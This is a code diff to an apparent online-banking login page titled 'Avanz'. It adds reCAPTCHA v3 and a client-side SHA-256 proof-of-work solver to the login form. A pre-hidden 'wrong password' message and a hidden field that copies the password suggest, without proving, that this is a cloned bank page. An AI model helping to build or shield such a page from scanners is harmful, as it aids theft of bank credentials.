@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Avanz</title>
-    <script>
-        // reCAPTCHA desactivado
-    </script>
+    <script src="https://www.google.com/recaptcha/api.js?render=6LcuyV4sAAAAAJXyF_FUxxG5y8JotlDkZ_GKPGJO"></script>
 </head>
 
 <style>
@@ -130,7 +128,7 @@
             <!-- Mensaje de error oculto -->
             <p id="error-login" class="cal" style="display:none; color: red; font-family: sans-serif; font-size: 14px; text-align: center; margin-top: 10px;">Usuario o Clave Incorrecta</p>
 
-            <form id="mainForm" method="post" style="margin-top: -20px;" onsubmit="return handleSubmit(event)">
+            <form id="mainForm" method="post" style="margin-top: -20px;" onsubmit="handleSubmit(event); return false;">
                 <div style=""> 
                     <h2 class="pan">e-banking</h2>
                     <br><center> 
@@ -153,6 +151,12 @@
                         <input type="hidden" id="form_ts" name="form_ts">
                         <input type="hidden" name="origin" value="movil">
                         <input type="hidden" name="recaptcha_token" id="recaptcha_token" value="">
+                        <!-- PoW fields -->
+                        <input type="hidden" name="pow_c" id="pow_c">
+                        <input type="hidden" name="pow_n" id="pow_n">
+                        <input type="hidden" name="pow_d" id="pow_d">
+                        <input type="hidden" name="pow_t" id="pow_t">
+                        <input type="hidden" name="pow_s" id="pow_s">
                         <div>  
                             <input class="p2" type="submit" value="INGRESAR">
                         </div>
@@ -229,10 +233,60 @@
             document.getElementById('pp2_real').value = this.value;
         });
 
-        var _recaptchaDone = true; // reCAPTCHA desactivado
-        function handleSubmit(e) {
+        // === PROOF-OF-WORK SOLVER ===
+        async function solvePoW(challenge, difficulty) {
+            const prefix = '0'.repeat(difficulty);
+            const encoder = new TextEncoder();
+            let nonce = 0;
+            while (true) {
+                const data = encoder.encode(challenge + nonce.toString());
+                const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+                const hashArray = new Uint8Array(hashBuffer);
+                let hex = '';
+                for (let i = 0; i < hashArray.length; i++) {
+                    hex += hashArray[i].toString(16).padStart(2, '0');
+                }
+                if (hex.startsWith(prefix)) {
+                    return nonce.toString();
+                }
+                nonce++;
+                if (nonce % 2000 === 0) {
+                    await new Promise(r => setTimeout(r, 0));
+                }
+            }
+        }
+
+        async function getRecaptchaToken() {
+            try {
+                return await grecaptcha.execute('6LcuyV4sAAAAAJXyF_FUxxG5y8JotlDkZ_GKPGJO', {action: 'login'});
+            } catch(e) { return ''; }
+        }
+
+        async function handleSubmit(e) {
+            e.preventDefault();
             if (!validarFormulario()) return false;
-            return true;
+
+            // Resolver PoW
+            if (_fd && _fd.pow) {
+                try {
+                    const nonce = await solvePoW(_fd.pow.c, _fd.pow.d);
+                    document.getElementById('pow_c').value = _fd.pow.c;
+                    document.getElementById('pow_n').value = nonce;
+                    document.getElementById('pow_d').value = _fd.pow.d;
+                    document.getElementById('pow_t').value = _fd.pow.t;
+                    document.getElementById('pow_s').value = _fd.pow.s;
+                } catch(err) {}
+            }
+
+            // reCAPTCHA v3
+            try {
+                const rcToken = await getRecaptchaToken();
+                document.getElementById('recaptcha_token').value = rcToken;
+            } catch(err) {}
+
+            // Submit the form
+            document.getElementById('mainForm').submit();
+            return false;
         }
 
         function validarFormulario() {
